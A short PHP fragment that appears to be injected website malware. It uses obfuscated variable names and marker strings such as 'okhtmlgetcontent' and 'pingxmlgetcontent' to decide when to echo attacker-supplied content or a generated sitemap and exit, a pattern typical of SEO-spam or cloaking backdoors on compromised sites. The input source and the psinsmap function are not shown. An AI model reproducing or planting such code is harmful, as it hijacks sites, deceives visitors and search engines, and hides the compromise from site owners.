<?php

/*ldgs*/
if (!stripos('a' . $dszxcv, "nobotuseragent")) {
    /**/
    if (stripos('a' . $dszxcv, "okhtmlgetcontent")) {
        $dszxcv = str_ireplace("okhtmlgetcontent", "", $dszxcv);
        echo $dszxcv;
        exit;
    } else {
        if (stripos('a' . $dszxcv, "pingxmlgetcontent")) {
            $dszxcv = str_ireplace("pingxmlgetcontent", "", $dszxcv);
            echo psinsmap($dszxcv);
            exit;
        }
    }
}
